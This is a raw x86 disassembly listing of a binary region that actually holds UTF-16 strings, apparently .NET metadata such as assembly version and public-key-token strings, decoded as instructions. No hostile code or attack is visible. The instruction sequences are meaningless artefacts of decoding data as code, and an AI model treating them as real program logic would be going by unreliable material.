  4086b5:	sbb    DWORD PTR [esi+0x0],eax
  4086b8:	imul   eax,DWORD PTR [eax],0x65006c
  4086be:	dec    esi
  4086bf:	add    BYTE PTR [edi+0x0],ch
  4086c2:	je     0x4086c4
  4086c4:	inc    esi
  4086c5:	add    BYTE PTR [edi+0x0],ch
  4086c8:	jne    0x4086ca
  4086ca:	outs   dx,BYTE PTR ds:[esi]
  4086cb:	add    BYTE PTR [eax+eax*1+0x0],ah
  4086cf:	or     eax,0x2d0020
  4086d4:	sub    eax,0x3e002d00
  4086d9:	add    BYTE PTR [eax],ah
  4086db:	add    BYTE PTR [ecx],al
  4086dd:	add    eax,0x20003a
  4086e2:	add    BYTE PTR [ebx],bl
  4086e4:	push   ebx
  4086e5:	add    BYTE PTR [eax+0x0],dh
  4086e8:	add    BYTE PTR gs:[ebx+0x0],ah
  4086ec:	imul   eax,DWORD PTR [eax],0x690066
  4086f2:	arpl   WORD PTR [eax],ax
  4086f4:	inc    ebp
  4086f5:	add    BYTE PTR [edx+0x0],dh
  4086f8:	jb     0x4086fa
  4086fa:	outs   dx,DWORD PTR ds:[esi]
  4086fb:	add    BYTE PTR [edx+0x0],dh
  4086fe:	add    BYTE PTR ds:0x720057,dl
  408704:	imul   eax,DWORD PTR [eax],0x650074
  40870a:	inc    ebp
  40870b:	add    BYTE PTR [edx+0x0],dh
  40870e:	jb     0x408710
  408710:	outs   dx,DWORD PTR ds:[esi]
  408711:	add    BYTE PTR [edx+0x0],dh
  408714:	add    BYTE PTR [ebx],bl
  408716:	inc    ebx
  408717:	add    BYTE PTR [edi+0x0],ch
  40871a:	jb     0x40871c
  40871c:	jb     0x40871e
  40871e:	jne    0x408720
  408720:	jo     0x408722
  408722:	je     0x408724
  408724:	dec    edi
  408725:	add    BYTE PTR [ebp+0x0],dh
  408728:	je     0x40872a
  40872a:	jo     0x40872c
  40872c:	jne    0x40872e
  40872e:	je     0x408730
  408730:	add    BYTE PTR ds:0x650044,ch
  408736:	ins    BYTE PTR es:[edi],dx
  408737:	add    BYTE PTR [ebp+0x0],ah
  40873a:	je     0x40873c
  40873c:	add    BYTE PTR gs:[edi+0x0],cl
  408740:	jne    0x408742
  408742:	je     0x408744
  408744:	jo     0x408746
  408746:	jne    0x408748
  408748:	je     0x40874a
  40874a:	inc    esi
  40874b:	add    BYTE PTR [ecx+0x0],ch
  40874e:	ins    BYTE PTR es:[edi],dx
  40874f:	add    BYTE PTR [ebp+0x0],ah
  408752:	inc    esi
  408753:	add    BYTE PTR [ecx+0x0],ah
  408756:	imul   eax,DWORD PTR [eax],0x65006c
  40875c:	add    BYTE PTR fs:[eax],al
  40875f:	and    eax,DWORD PTR [edi+0x0]
  408762:	add    BYTE PTR gs:[esi+0x0],ch
  408766:	add    BYTE PTR gs:[edx+0x0],dh
  40876a:	imul   eax,DWORD PTR [eax],0x570063
  408770:	jb     0x408772
  408772:	imul   eax,DWORD PTR [eax],0x650074
  408778:	inc    ebp
  408779:	add    BYTE PTR [edx+0x0],dh
  40877c:	jb     0x40877e
  40877e:	outs   dx,DWORD PTR ds:[esi]
  40877f:	add    BYTE PTR [edx+0x0],dh
  408782:	add    BYTE PTR [ebx],bl
  408784:	inc    edx
  408785:	add    BYTE PTR [ebp+0x0],ah
  408788:	add    BYTE PTR [bx+di+0x0],ch
  40878c:	outs   dx,BYTE PTR ds:[esi]
  40878d:	add    BYTE PTR [ebx+0x0],dl
  408790:	push   esp
  408791:	add    BYTE PTR [edx+0x0],dl
  408794:	inc    ebx
  408795:	add    BYTE PTR [eax+eax*1+0x61],ch
  408799:	add    BYTE PTR [ebx+0x0],dh
  40879c:	jae    0x40879e
  40879e:	add    BYTE PTR ds:0x650042,ch
  4087a4:	add    BYTE PTR [bx+di+0x0],ch
  4087a8:	outs   dx,BYTE PTR ds:[esi]
  4087a9:	add    BYTE PTR [ebx+0x0],dl
  4087ac:	push   esp
  4087ad:	add    BYTE PTR [edx+0x0],dl
  4087b0:	inc    ebx
  4087b1:	add    BYTE PTR [eax+eax*1+0x61],ch
  4087b5:	add    BYTE PTR [ebx+0x0],dh
  4087b8:	jae    0x4087ba
  4087ba:	dec    esi
  4087bb:	add    BYTE PTR [ecx+0x0],ah
  4087be:	ins    DWORD PTR es:[edi],dx
  4087bf:	add    BYTE PTR [ebp+0x0],ah
  4087c2:	jae    0x4087c4
  4087c4:	jo     0x4087c6
  4087c6:	popa   
  4087c7:	add    BYTE PTR [ebx+0x0],ah
  4087ca:	add    BYTE PTR gs:[eax],al
  4087cd:	add    ebp,DWORD PTR [esi]
  4087cf:	add    BYTE PTR [eax],al
  4087d1:	xor    eax,0x6c0043
  4087d6:	popa   
  4087d7:	add    BYTE PTR [ebx+0x0],dh
  4087da:	jae    0x4087dc
  4087dc:	outs   dx,BYTE PTR ds:[esi]
  4087dd:	add    BYTE PTR [ecx+0x0],ah
  4087e0:	ins    DWORD PTR es:[edi],dx
  4087e1:	add    BYTE PTR [ebp+0x0],ah
  4087e4:	dec    ebp
  4087e5:	add    BYTE PTR [ebp+0x0],dh
  4087e8:	jae    0x4087ea
  4087ea:	je     0x4087ec
  4087ec:	dec    ebp
  4087ed:	add    BYTE PTR [ecx+0x0],ah
  4087f0:	je     0x4087f2
  4087f2:	arpl   WORD PTR [eax],ax
  4087f4:	push   0x61004200
  4087f9:	add    BYTE PTR [ebx+0x0],dh
  4087fc:	add    BYTE PTR gs:[esi+0x0],ch
  408800:	popa   
  408801:	add    BYTE PTR [ebp+0x0],ch
  408804:	add    BYTE PTR gs:[eax],al
  408807:	adc    eax,0x790053
  40880c:	jae    0x40880e
  40880e:	je     0x408810
  408810:	add    BYTE PTR gs:[ebp+0x0],ch
  408814:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  408819:	add    BYTE PTR [eax+eax*1+0x0],ch
  40881d:	and    eax,0x6e0055
  408822:	ins    DWORD PTR es:[edi],dx
  408823:	add    BYTE PTR [ecx+0x0],ah
  408826:	jo     0x408828
  408828:	jo     0x40882a
  40882a:	popa   
  40882b:	add    BYTE PTR [edx+0x0],ah
  40882e:	ins    BYTE PTR es:[edi],dx
  40882f:	add    BYTE PTR [ebp+0x0],ah
  408832:	push   edx
  408833:	add    BYTE PTR [ebp+0x0],ah
  408836:	jae    0x408838
  408838:	outs   dx,DWORD PTR ds:[esi]
  408839:	add    BYTE PTR [ebp+0x0],dh
  40883c:	jb     0x40883e
  40883e:	arpl   WORD PTR [eax],ax
  408840:	add    BYTE PTR gs:[eax],al
  408843:	cmove  eax,DWORD PTR [eax]
  408846:	outs   dx,DWORD PTR ds:[esi]
  408847:	add    BYTE PTR [esi+0x0],ch
  40884a:	add    BYTE PTR gs:[eax+eax*1+0x6f],al
  40884f:	add    BYTE PTR [eax+eax*1+0x0],dh
  408853:	or     eax,0x650052
  408858:	popa   
  408859:	add    BYTE PTR [eax+eax*1+0x49],ah
  40885d:	add    BYTE PTR [esi+0x0],ch
  408860:	add    BYTE PTR [ecx],dl
  408862:	jae    0x408864
  408864:	je     0x408866
  408866:	jb     0x408868
  408868:	imul   eax,DWORD PTR [eax],0x67006e
  40886e:	jae    0x408870
  408870:	pop    ebp
  408871:	add    BYTE PTR [eax],al
  408873:	and    eax,0x740053
  408878:	jb     0x40887a
  40887a:	imul   eax,DWORD PTR [eax],0x67006e
  408880:	jae    0x408882
  408882:	push   esp
  408883:	add    BYTE PTR [ecx+0x0],ah
  408886:	add    BYTE PTR [bx+0x0],cl
  40888a:	bound  eax,QWORD PTR [eax]
  40888c:	jae    0x40888e
  40888e:	outs   dx,DWORD PTR ds:[esi]
  40888f:	add    BYTE PTR [eax+eax*1+0x65],ch
  408893:	add    BYTE PTR [eax+eax*1+0x65],dh
  408897:	add    BYTE PTR [eax],al
  408899:	sbb    eax,0x4e0049
  40889e:	inc    esi
  40889f:	add    BYTE PTR [esi+0x0],al
  4088a2:	imul   eax,DWORD PTR [eax],0x65006c
  4088a8:	inc    edx
  4088a9:	add    BYTE PTR [edx+0x0],dh
  4088ac:	popa   
  4088ad:	add    BYTE PTR [ebx+0x0],ah
  4088b0:	imul   eax,DWORD PTR [eax],0x65
  4088b3:	add    BYTE PTR [eax+eax*1+0x0],dh
  4088b7:	daa    
  4088b8:	dec    esi
  4088b9:	add    BYTE PTR [edi+0x0],ch
  4088bc:	inc    ebp
  4088bd:	add    BYTE PTR [ecx+0x0],dh
  4088c0:	jne    0x4088c2
  4088c2:	popa   
  4088c3:	add    BYTE PTR [eax+eax*1+0x73],ch
  4088c7:	add    BYTE PTR [edi+0x0],dl
  4088ca:	imul   eax,DWORD PTR [eax],0x680074
  4088d0:	dec    esi
  4088d1:	add    BYTE PTR [ebp+0x0],ah
  4088d4:	ja     0x4088d6
  4088d6:	dec    esp
  4088d7:	add    BYTE PTR [ecx+0x0],ch
  4088da:	outs   dx,BYTE PTR ds:[esi]
  4088db:	add    BYTE PTR [ebp+0x0],ah
  4088de:	add    BYTE PTR [ecx],dl
  4088e0:	dec    esi
  4088e1:	add    BYTE PTR [edi+0x0],ch
  4088e4:	inc    ebp
  4088e5:	add    BYTE PTR [ecx+0x0],dh
  4088e8:	jne    0x4088ea
  4088ea:	popa   
  4088eb:	add    BYTE PTR [eax+eax*1+0x73],ch
  4088ef:	add    BYTE PTR [eax],al
  4088f1:	adc    eax,DWORD PTR [edx+0x0]
  4088f4:	popa   
  4088f5:	add    BYTE PTR [eax+eax*1+0x45],ah
  4088f9:	add    BYTE PTR [ebx+0x0],dh
  4088fc:	arpl   WORD PTR [eax],ax
  4088fe:	popa   
  4088ff:	add    BYTE PTR [eax+0x0],dh
  408902:	add    BYTE PTR gs:[eax],al
  408905:	sbb    DWORD PTR [edx+0x0],eax
  408908:	add    BYTE PTR gs:[edi+0x0],ah
  40890c:	imul   eax,DWORD PTR [eax],0x57006e
  408912:	jb     0x408914
  408914:	imul   eax,DWORD PTR [eax],0x690074
  40891a:	outs   dx,BYTE PTR ds:[esi]
  40891b:	add    BYTE PTR [edi+0x0],ah
  40891e:	add    BYTE PTR ds:0x6e004f,dl
  408924:	ins    BYTE PTR es:[edi],dx
  408925:	add    BYTE PTR [ecx+0x0],bh
  408928:	push   ebx
  408929:	add    BYTE PTR [eax+eax*1+0x72],dh
  40892d:	add    BYTE PTR [ecx+0x0],ch
  408930:	outs   dx,BYTE PTR ds:[esi]
  408931:	add    BYTE PTR [edi+0x0],ah
  408934:	add    BYTE PTR [ebx],al
  408936:	pop    esp
  408937:	add    BYTE PTR [eax],al
  408939:	add    eax,0x5c005c
  40893e:	add    BYTE PTR [ebx],al
  408940:	or     al,BYTE PTR [eax]
  408942:	add    BYTE PTR ds:0x6e005c,al
  408948:	add    BYTE PTR [ebx],al
  40894a:	or     eax,0x5c050000
  40894f:	add    BYTE PTR [edx+0x0],dh
  408952:	add    BYTE PTR [ebx],al
  408954:	or     DWORD PTR [eax],eax
  408956:	add    BYTE PTR ds:0x74005c,al
  40895c:	add    BYTE PTR [edi],cl
  40895e:	jnp    0x408960
  408960:	xor    BYTE PTR [eax],al
  408962:	jge    0x408964
  408964:	cmp    eax,0x31007b00
  408969:	add    BYTE PTR [ebp+0x0],bh
  40896c:	add    BYTE PTR [ebx],cl
  40896e:	push   ebp
  40896f:	add    BYTE PTR [ebx+0x0],dh
  408972:	popa   
  408973:	add    BYTE PTR [edi+0x0],ah
  408976:	add    BYTE PTR gs:[eax],al
  408979:	sbb    eax,0x610056
  40897e:	ins    BYTE PTR es:[edi],dx
  40897f:	add    BYTE PTR [ecx+0x0],ch
  408982:	add    BYTE PTR fs:[eax+eax*1+0x61],cl
  408987:	add    BYTE PTR [esi+0x0],ch
  40898a:	add    BYTE PTR [di+0x0],dh
  40898e:	popa   
  40898f:	add    BYTE PTR [edi+0x0],ah
  408992:	add    BYTE PTR gs:[ebx+0x0],dh
  408996:	add    BYTE PTR ds:0x20002c,al
  40899c:	add    BYTE PTR [edi],al
  40899e:	dec    esi
  40899f:	add    BYTE PTR [ecx+0x0],bl
  4089a2:	dec    ecx
  4089a3:	add    BYTE PTR [eax],al
  4089a5:	add    BYTE PTR [eax],al
  4089a7:	add    dh,dh
  4089a9:	pop    ecx
  4089aa:	cwde   
  4089ab:	and    eax,0x4c3f9172
  4089b0:	xchg   ecx,eax
  4089b1:	jo     0x4089ea
  4089b3:	push   ss
  4089b4:	std    
  4089b5:	cwde   
  4089b6:	or     al,BYTE PTR [ebx+0x0]
  4089b9:	or     BYTE PTR [edi+0x19565c7a],dh
  4089bf:	xor    al,0xe0
  4089c1:	mov    DWORD PTR [edx],eax
  4089c3:	push   es
  4089c4:	push   cs
  4089c5:	push   cs
  4089c6:	xor    al,BYTE PTR [eax]
  4089c8:	add    BYTE PTR cs:[eax],dh
  4089cb:	add    BYTE PTR [esi],ch
  4089cd:	add    BYTE PTR [eax],dh
  4089cf:	add    BYTE PTR [esi],ch
  4089d1:	add    BYTE PTR [eax],dh
  4089d3:	add    BYTE PTR [esi],cl
  4089d5:	xor    eax,DWORD PTR [eax]
  4089d7:	add    BYTE PTR cs:0x30002e00,dh
  4089de:	add    BYTE PTR [esi],ch
  4089e0:	add    BYTE PTR [eax],dh
  4089e2:	add    BYTE PTR [edx+edx*2],dl
  4089e5:	add    BYTE PTR [ebp+0x0],ah
  4089e8:	jae    0x4089ea
  4089ea:	inc    edi
  4089eb:	add    BYTE PTR [ebp+0x0],ah
  4089ee:	outs   dx,BYTE PTR ds:[esi]
  4089ef:	add    BYTE PTR [esi],ch
  4089f1:	add    BYTE PTR [ebp+0x0],ah
  4089f4:	js     0x4089f6
  4089f6:	add    BYTE PTR gs:[ecx+ebp*4+0x0],bl
  4089fb:	and    BYTE PTR [eax],al
  4089fd:	dec    ebp
  4089fe:	add    BYTE PTR [ecx+0x0],ch
  408a01:	arpl   WORD PTR [eax],ax
  408a03:	jb     0x408a05
  408a05:	outs   dx,DWORD PTR ds:[esi]
  408a06:	add    BYTE PTR [ebx+0x0],dh
  408a09:	outs   dx,DWORD PTR ds:[esi]
  408a0a:	add    BYTE PTR [esi+0x0],ah
  408a0d:	je     0x408a0f
  408a0f:	and    BYTE PTR [eax],al
  408a11:	inc    ebx
  408a12:	add    BYTE PTR [edi+0x0],ch
  408a15:	jb     0x408a17
  408a17:	jo     0x408a19
  408a19:	outs   dx,DWORD PTR ds:[esi]
  408a1a:	add    BYTE PTR [edx+0x0],dh
  408a1d:	popa   
  408a1e:	add    BYTE PTR [eax+eax*1+0x69],dh
  408a22:	add    BYTE PTR [edi+0x0],ch
  408a25:	outs   dx,BYTE PTR ds:[esi]
  408a26:	add    BYTE PTR [esi],ch
  408a28:	add    BYTE PTR [eax],ah
  408a2a:	add    BYTE PTR [eax],ah
  408a2c:	add    BYTE PTR [ecx+0x0],al
  408a2f:	ins    BYTE PTR es:[edi],dx
  408a30:	add    BYTE PTR [eax+eax*1+0x20],ch
  408a34:	add    BYTE PTR [edx+0x0],dh
  408a37:	imul   eax,DWORD PTR [eax],0x680067
  408a3d:	je     0x408a3f
  408a3f:	jae    0x408a41
  408a41:	and    BYTE PTR [eax],al
  408a43:	jb     0x408a45
  408a45:	add    BYTE PTR gs:[ebx+0x0],dh
  408a49:	add    BYTE PTR gs:[edx+0x0],dh
  408a4d:	jbe    0x408a4f
  408a4f:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  408a54:	add    BYTE PTR [ebx+esi*1],bl
  408a57:	add    BYTE PTR [esi],ch
  408a59:	add    BYTE PTR ds:0x33002e00,dh
  408a5f:	add    BYTE PTR [eax],dh
  408a61:	add    BYTE PTR [edi],dh
  408a63:	add    BYTE PTR [edx],dh
  408a65:	add    BYTE PTR [ecx],bh
  408a67:	add    BYTE PTR [esi],ch
  408a69:	add    BYTE PTR [eax+eax*1],dh
  408a6c:	xor    eax,0x37003000
  408a71:	add    BYTE PTR [edx],al
  408a73:	push   es
  408a74:	or     BYTE PTR [ecx+ecx*1],al
  408a77:	js     0x408a79
  408a79:	add    BYTE PTR [eax],ah
  408a7b:	bound  eax,QWORD PTR [eax]
  408a7d:	aaa    
  408a7e:	add    BYTE PTR [edi],dh
  408a80:	add    BYTE PTR [ecx+0x0],ah
  408a83:	xor    eax,0x35006300
  408a88:	add    BYTE PTR [esi],dh
  408a8a:	add    BYTE PTR [ecx],dh
  408a8c:	add    BYTE PTR [ecx],bh
  408a8e:	add    BYTE PTR [ebx],dh
  408a90:	add    BYTE PTR [eax+eax*1],dh
  408a93:	add    BYTE PTR gs:[eax],dh
  408a96:	add    BYTE PTR [eax],bh
  408a98:	add    BYTE PTR [ecx],bh
  408a9a:	add    BYTE PTR [eax+0x30],al
  408a9d:	add    BYTE PTR [eax],dh
  408a9f:	add    BYTE PTR [eax],dh
  408aa1:	add    BYTE PTR [eax],dh
  408aa3:	add    BYTE PTR [eax],dh
  408aa5:	add    BYTE PTR [eax],dh
  408aa7:	add    BYTE PTR [eax],dh
  408aa9:	add    BYTE PTR [eax],dh
  408aab:	add    BYTE PTR [eax],dh
  408aad:	add    BYTE PTR [eax],dh
  408aaf:	add    BYTE PTR [eax],dh
  408ab1:	add    BYTE PTR [eax],dh
  408ab3:	add    BYTE PTR [eax],dh
  408ab5:	add    BYTE PTR [eax],dh
  408ab7:	add    BYTE PTR [eax],dh
  408ab9:	add    BYTE PTR [eax],dh
  408abb:	add    BYTE PTR [eax],dh
  408abd:	add    BYTE PTR [eax+eax*1],dh
  408ac0:	xor    BYTE PTR [eax],al
  408ac2:	xor    BYTE PTR [eax],al
  408ac4:	xor    BYTE PTR [eax],al
  408ac6:	xor    BYTE PTR [eax],al
  408ac8:	xor    BYTE PTR [eax],al
  408aca:	xor    BYTE PTR [eax],al
  408acc:	xor    BYTE PTR [eax],al
  408ace:	xor    BYTE PTR [eax],al
  408ad0:	xor    BYTE PTR [eax],al
  408ad2:	xor    BYTE PTR [eax],al
  408ad4:	xor    BYTE PTR [eax],al
  408ad6:	xor    BYTE PTR [eax],al
  408ad8:	xor    BYTE PTR [eax],al
  408ada:	xor    BYTE PTR [eax],al
  408adc:	adc    BYTE PTR [esi+0x73006d],0x63
  408ae3:	add    BYTE PTR [edi+0x0],ch
  408ae6:	jb     0x408ae8
  408ae8:	ins    BYTE PTR es:[edi],dx
  408ae9:	add    BYTE PTR [ecx+0x0],ch
  408aec:	bound  eax,QWORD PTR [eax]
  408aee:	sub    al,0x0
  408af0:	and    BYTE PTR [eax],al
  408af2:	push   esi
  408af3:	add    BYTE PTR [ebp+0x0],ah
  408af6:	jb     0x408af8
  408af8:	jae    0x408afa
  408afa:	imul   eax,DWORD PTR [eax],0x6e006f
  408b00:	cmp    eax,0x2e003200
  408b05:	add    BYTE PTR [eax],dh
  408b07:	add    BYTE PTR [esi],ch
  408b09:	add    BYTE PTR [eax],dh
  408b0b:	add    BYTE PTR [esi],ch
  408b0d:	add    BYTE PTR [eax],dh
  408b0f:	add    BYTE PTR [eax+eax*1],ch
  408b12:	and    BYTE PTR [eax],al
  408b14:	inc    ebx
  408b15:	add    BYTE PTR [ebp+0x0],dh
  408b18:	ins    BYTE PTR es:[edi],dx
  408b19:	add    BYTE PTR [eax+eax*1+0x75],dh
  408b1d:	add    BYTE PTR [edx+0x0],dh
  408b20:	add    BYTE PTR gs:0x65006e00,bh
  408b27:	add    BYTE PTR [ebp+0x0],dh
  408b2a:	je     0x408b2c
  408b2c:	jb     0x408b2e
  408b2e:	popa   
  408b2f:	add    BYTE PTR [eax+eax*1+0x2c],ch
  408b33:	add    BYTE PTR [eax],ah
  408b35:	add    BYTE PTR [eax+0x0],dl
  408b38:	jne    0x408b3a
  408b3a:	bound  eax,QWORD PTR [eax]
  408b3c:	ins    BYTE PTR es:[edi],dx
  408b3d:	add    BYTE PTR [ecx+0x0],ch
  408b40:	arpl   WORD PTR [eax],ax
  408b42:	dec    ebx
  408b43:	add    BYTE PTR [ebp+0x0],ah
  408b46:	jns    0x408b48
  408b48:	push   esp
  408b49:	add    BYTE PTR [edi+0x0],ch
  408b4c:	imul   eax,DWORD PTR [eax],0x65
  408b4f:	add    BYTE PTR [esi+0x0],ch
  408b52:	cmp    eax,0x37006200
  408b57:	add    BYTE PTR [edi],dh
  408b59:	add    BYTE PTR [ecx+0x0],ah
  408b5c:	xor    eax,0x35006300
  408b61:	add    BYTE PTR [esi],dh
  408b63:	add    BYTE PTR [ecx],dh
  408b65:	add    BYTE PTR [ecx],bh
  408b67:	add    BYTE PTR [ebx],dh
  408b69:	add    BYTE PTR [eax+eax*1],dh
  408b6c:	add    BYTE PTR gs:[eax],dh
  408b6f:	add    BYTE PTR [eax],bh
  408b71:	add    BYTE PTR [ecx],bh
  408b73:	add    BYTE PTR [eax+0x7900539c],al
  408b79:	add    BYTE PTR [ebx+0x0],dh
  408b7c:	je     0x408b7e
  408b7e:	add    BYTE PTR gs:[ebp+0x0],ch
  408b82:	add    BYTE PTR cs:[eax+eax*1+0x61],al
  408b87:	add    BYTE PTR [eax+eax*1+0x61],dh
  408b8b:	add    BYTE PTR [eax+eax*1],ch
  408b8e:	and    BYTE PTR [eax],al
  408b90:	push   esi
  408b91:	add    BYTE PTR [ebp+0x0],ah
  408b94:	jb     0x408b96
  408b96:	jae    0x408b98
  408b98:	imul   eax,DWORD PTR [eax],0x6e006f
  408b9e:	cmp    eax,0x2e003200
  408ba3:	add    BYTE PTR [eax],dh
  408ba5:	add    BYTE PTR [esi],ch
  408ba7:	add    BYTE PTR [eax],dh
  408ba9:	add    BYTE PTR [esi],ch
  408bab:	add    BYTE PTR [eax],dh
  408bad:	add    BYTE PTR [eax+eax*1],ch
  408bb0:	and    BYTE PTR [eax],al
  408bb2:	inc    ebx
  408bb3:	add    BYTE PTR [ebp+0x0],dh
  408bb6:	ins    BYTE PTR es:[edi],dx
  408bb7:	add    BYTE PTR [eax+eax*1+0x75],dh
  408bbb:	add    BYTE PTR [edx+0x0],dh
  408bbe:	add    BYTE PTR gs:0x65006e00,bh
  408bc5:	add    BYTE PTR [ebp+0x0],dh
  408bc8:	je     0x408bca
  408bca:	jb     0x408bcc
  408bcc:	popa   
  408bcd:	add    BYTE PTR [eax+eax*1+0x2c],ch
  408bd1:	add    BYTE PTR [eax],ah
  408bd3:	add    BYTE PTR [eax+0x0],dl
  408bd6:	jne    0x408bd8
  408bd8:	bound  eax,QWORD PTR [eax]
  408bda:	ins    BYTE PTR es:[edi],dx
  408bdb:	add    BYTE PTR [ecx+0x0],ch
  408bde:	arpl   WORD PTR [eax],ax
  408be0:	dec    ebx
  408be1:	add    BYTE PTR [ebp+0x0],ah
  408be4:	jns    0x408be6
  408be6:	push   esp
  408be7:	add    BYTE PTR [edi+0x0],ch
  408bea:	imul   eax,DWORD PTR [eax],0x65
  408bed:	add    BYTE PTR [esi+0x0],ch
  408bf0:	cmp    eax,0x37006200
  408bf5:	add    BYTE PTR [edi],dh
  408bf7:	add    BYTE PTR [ecx+0x0],ah
  408bfa:	xor    eax,0x35006300
  408bff:	add    BYTE PTR [esi],dh
  408c01:	add    BYTE PTR [ecx],dh
  408c03:	add    BYTE PTR [ecx],bh
  408c05:	add    BYTE PTR [ebx],dh
  408c07:	add    BYTE PTR [eax+eax*1],dh
  408c0a:	add    BYTE PTR gs:[eax],dh
  408c0d:	add    BYTE PTR [eax],bh
  408c0f:	add    BYTE PTR [ecx],bh
  408c11:	add    BYTE PTR [eax+0x790053b6],al
  408c17:	add    BYTE PTR [ebx+0x0],dh
  408c1a:	je     0x408c1c
  408c1c:	add    BYTE PTR gs:[ebp+0x0],ch
  408c20:	add    BYTE PTR cs:[eax+eax*1+0x61],al
  408c25:	add    BYTE PTR [eax+eax*1+0x61],dh
  408c29:	add    BYTE PTR [esi],ch
  408c2b:	add    BYTE PTR [edi+0x0],cl
  408c2e:	jb     0x408c30
  408c30:	popa   
  408c31:	add    BYTE PTR [ebx+0x0],ah
  408c34:	ins    BYTE PTR es:[edi],dx
  408c35:	add    BYTE PTR [ebp+0x0],ah
  408c38:	inc    ebx
  408c39:	add    BYTE PTR [eax+eax*1+0x69],ch
  408c3d:	add    BYTE PTR [ebp+0x0],ah
  408c40:	outs   dx,BYTE PTR ds:[esi]
  408c41:	add    BYTE PTR [eax+eax*1+0x2c],dh
  408c45:	add    BYTE PTR [eax],ah
  408c47:	add    BYTE PTR [esi+0x0],dl
  408c4a:	add    BYTE PTR gs:[edx+0x0],dh
  408c4e:	jae    0x408c50
  408c50:	imul   eax,DWORD PTR [eax],0x6e006f
  408c56:	cmp    eax,0x2e003200
  408c5b:	add    BYTE PTR [eax],dh
  408c5d:	add    BYTE PTR [esi],ch
  408c5f:	add    BYTE PTR [eax],dh
  408c61:	add    BYTE PTR [esi],ch
  408c63:	add    BYTE PTR [eax],dh
  408c65:	add    BYTE PTR [eax+eax*1],ch
  408c68:	and    BYTE PTR [eax],al
  408c6a:	inc    ebx
  408c6b:	add    BYTE PTR [ebp+0x0],dh
  408c6e:	ins    BYTE PTR es:[edi],dx
  408c6f:	add    BYTE PTR [eax+eax*1+0x75],dh
  408c73:	add    BYTE PTR [edx+0x0],dh
  408c76:	add    BYTE PTR gs:0x65006e00,bh
  408c7d:	add    BYTE PTR [ebp+0x0],dh
  408c80:	je     0x408c82
  408c82:	jb     0x408c84
  408c84:	popa   
  408c85:	add    BYTE PTR [eax+eax*1+0x2c],ch
  408c89:	add    BYTE PTR [eax],ah
  408c8b:	add    BYTE PTR [eax+0x0],dl
  408c8e:	jne    0x408c90
  408c90:	bound  eax,QWORD PTR [eax]
  408c92:	ins    BYTE PTR es:[edi],dx
  408c93:	add    BYTE PTR [ecx+0x0],ch
  408c96:	arpl   WORD PTR [eax],ax
  408c98:	dec    ebx
  408c99:	add    BYTE PTR [ebp+0x0],ah
  408c9c:	jns    0x408c9e
  408c9e:	push   esp
  408c9f:	add    BYTE PTR [edi+0x0],ch
  408ca2:	imul   eax,DWORD PTR [eax],0x65
  408ca5:	add    BYTE PTR [esi+0x0],ch
  408ca8:	cmp    eax,0x37006200
  408cad:	add    BYTE PTR [edi],dh
  408caf:	add    BYTE PTR [ecx+0x0],ah
  408cb2:	xor    eax,0x35006300
  408cb7:	add    BYTE PTR [esi],dh
  408cb9:	add    BYTE PTR [ecx],dh
  408cbb:	add    BYTE PTR [ecx],bh
  408cbd:	add    BYTE PTR [ebx],dh
  408cbf:	add    BYTE PTR [eax+eax*1],dh
  408cc2:	add    BYTE PTR gs:[eax],dh
  408cc5:	add    BYTE PTR [eax],bh
  408cc7:	add    BYTE PTR [ecx],bh
  408cc9:	add    BYTE PTR [eax+0x79005392],al
  408ccf:	add    BYTE PTR [ebx+0x0],dh
  408cd2:	je     0x408cd4
  408cd4:	add    BYTE PTR gs:[ebp+0x0],ch
  408cd8:	sub    al,0x0
  408cda:	and    BYTE PTR [eax],al
  408cdc:	push   esi
  408cdd:	add    BYTE PTR [ebp+0x0],ah
  408ce0:	jb     0x408ce2
  408ce2:	jae    0x408ce4
  408ce4:	imul   eax,DWORD PTR [eax],0x6e006f
  408cea:	cmp    eax,0x2e003200
  408cef:	add    BYTE PTR [eax],dh
  408cf1:	add    BYTE PTR [esi],ch
  408cf3:	add    BYTE PTR [eax],dh
  408cf5:	add    BYTE PTR [esi],ch
  408cf7:	add    BYTE PTR [eax],dh
  408cf9:	add    BYTE PTR [eax+eax*1],ch
  408cfc:	and    BYTE PTR [eax],al
  408cfe:	inc    ebx
  408cff:	add    BYTE PTR [ebp+0x0],dh
  408d02:	ins    BYTE PTR es:[edi],dx
  408d03:	add    BYTE PTR [eax+eax*1+0x75],dh
  408d07:	add    BYTE PTR [edx+0x0],dh
  408d0a:	add    BYTE PTR gs:0x65006e00,bh
  408d11:	add    BYTE PTR [ebp+0x0],dh
  408d14:	je     0x408d16
  408d16:	jb     0x408d18
  408d18:	popa   
  408d19:	add    BYTE PTR [eax+eax*1+0x2c],ch
  408d1d:	add    BYTE PTR [eax],ah
  408d1f:	add    BYTE PTR [eax+0x0],dl
  408d22:	jne    0x408d24
  408d24:	bound  eax,QWORD PTR [eax]
  408d26:	ins    BYTE PTR es:[edi],dx
  408d27:	add    BYTE PTR [ecx+0x0],ch
  408d2a:	arpl   WORD PTR [eax],ax
  408d2c:	dec    ebx
  408d2d:	add    BYTE PTR [ebp+0x0],ah
  408d30:	jns    0x408d32
  408d32:	push   esp
  408d33:	add    BYTE PTR [edi+0x0],ch
  408d36:	imul   eax,DWORD PTR [eax],0x65
  408d39:	add    BYTE PTR [esi+0x0],ch
  408d3c:	cmp    eax,0x37006200
  408d41:	add    BYTE PTR [edi],dh
  408d43:	add    BYTE PTR [ecx+0x0],ah
  408d46:	xor    eax,0x35006300
  408d4b:	add    BYTE PTR [esi],dh
  408d4d:	add    BYTE PTR [ecx],dh
  408d4f:	add    BYTE PTR [ecx],bh
  408d51:	add    BYTE PTR [ebx],dh
  408d53:	add    BYTE PTR [eax+eax*1],dh
  408d56:	add    BYTE PTR gs:[eax],dh
  408d59:	add    BYTE PTR [eax],bh
  408d5b:	add    BYTE PTR [ecx],bh
  408d5d:	add    BYTE PTR [eax+0x790053b4],al
  408d63:	add    BYTE PTR [ebx+0x0],dh
  408d66:	je     0x408d68
  408d68:	add    BYTE PTR gs:[ebp+0x0],ch
  408d6c:	add    BYTE PTR cs:[edx+0x0],dl
  408d70:	jne    0x408d72
  408d72:	outs   dx,BYTE PTR ds:[esi]
  408d73:	add    BYTE PTR [eax+eax*1+0x69],dh
  408d77:	add    BYTE PTR [ebp+0x0],ch
  408d7a:	add    BYTE PTR gs:[esi],ch
  408d7d:	add    BYTE PTR [edx+0x0],dl
  408d80:	add    BYTE PTR gs:[ebp+0x0],ch
  408d84:	outs   dx,DWORD PTR ds:[esi]
